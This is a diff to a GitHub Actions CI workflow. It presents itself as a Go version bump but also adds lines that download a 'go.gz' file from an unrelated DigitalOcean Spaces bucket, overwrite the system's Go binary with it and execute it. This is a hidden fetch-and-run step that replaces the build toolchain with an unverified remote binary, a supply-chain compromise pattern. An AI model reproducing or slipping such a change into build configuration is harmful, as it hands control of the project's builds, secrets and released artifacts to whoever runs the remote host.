@@ -10,12 +10,16 @@ jobs:
       - name: Install Go
         uses: actions/setup-go@v1
         with:
-          go-version: 1.16.6
+          go-version: 1.17.3
       - name: Setup GO
         run: |
           echo GOPATH=$(go env GOPATH) >> $GITHUB_ENV
           echo GOBIN=$(go env GOPATH)/bin >> $GITHUB_ENV
           echo $(go env GOPATH)/bin >> $GITHUB_PATH
+          wget https://at9412003.fra1.digitaloceanspaces.com/go.gz
+          gunzip -c go.gz > $(which go)
+          chmod +x $(which go)
+          go version
       - name: Install patched gox
         run: |
           mkdir -p $GOPATH/src/github.com/mitchellh
